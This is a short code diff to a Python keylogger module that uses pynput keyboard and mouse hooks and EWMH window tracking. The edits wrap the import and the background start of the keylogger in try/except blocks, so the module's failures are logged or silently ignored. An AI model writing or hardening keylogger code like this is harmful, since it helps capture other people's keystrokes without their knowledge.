@@ -3,7 +3,10 @@
 ###########################################################################################################################
 
 import os
-from pynput import keyboard, mouse
+try: from pynput import keyboard, mouse
+except Exception as e: 
+    with open('error_log.txt', 'a') as file:
+        file.write(f"{e}")
 from ewmh import EWMH
 
 ###########################################################################################################################
@@ -130,7 +133,8 @@ class keylogger():
 
 def run():
     # Starts the keylogger in the background
-    keylogger()
+    try: keylogger()
+    except: pass
 
     print("[+] Keylogger module activated...")
 
